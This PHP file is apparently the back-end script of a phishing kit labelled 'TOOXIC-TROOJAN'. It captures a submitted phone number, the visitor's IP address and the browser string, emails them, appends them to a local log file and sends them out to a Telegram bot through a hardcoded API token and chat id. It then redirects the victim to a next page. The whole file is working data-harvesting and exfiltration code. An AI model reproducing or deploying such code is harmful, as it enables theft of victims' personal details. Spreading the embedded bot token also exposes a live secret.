<?php
$IP = getenv("REMOTE_ADDR");
$message .= "--++--[number ]---++--\n";
$message .= "+ : ".$_POST['title=""']."\n";
$message .= "number : ".$_POST['number']."\n";
$message .= "--- IP Infos ---\n";

$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";

$message .= "--- TOOXIC-TROOJAN ---\n";
$sender = "whatsapp number";
$subject = "sa Post [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
mail($email,$subject,$message);
    $text = fopen('../oomar.txt', 'a');
fwrite($text, $message);

$token = "5281489010:AAGXEGe-0xkBJfnC_VI7EDyyc2ReuTcf1fA";
$data = [
    'text' => $message,
    'chat_id' => '-1001597781519'
];

file_get_contents("https://api.telegram.org/bot5281489010:AAGXEGe-0xkBJfnC_VI7EDyyc2ReuTcf1fA/sendMessage?" . http_build_query($data) );

header("Location: next.php");
?>